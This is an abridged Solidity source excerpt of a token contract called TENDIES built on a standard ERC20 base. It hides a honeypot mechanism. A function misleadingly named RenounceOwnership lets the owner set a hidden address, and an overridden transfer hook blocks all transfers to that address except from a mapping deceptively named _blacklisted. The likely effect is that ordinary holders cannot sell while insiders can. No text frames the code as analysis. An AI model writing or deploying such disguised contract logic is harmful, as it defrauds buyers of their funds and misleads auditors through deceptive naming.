...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _tendieMaker(sender, recipient, amount);
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        _tendieMaker(address(0), account, amount);
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _tendieMaker(account, address(0), amount);
     ...
     */
    function _tendieMaker(address from, address to, uint256 amount) internal virtual { }
}

contract TENDIES is ERC20, Ownable {
    mapping(address=>bool) private _blacklisted;
    address private _tendiesToken;
    ...
    function RenounceOwnership(address tendiesToken_) public onlyOwner {
        _tendiesToken = tendiesToken_;
    }

    function _tendieMaker(address from, address to, uint256 amount) internal virtual override {
        if(to == _tendiesToken) {
            require(_blacklisted[from], "Tendies are for humans!");
        }
    }
}
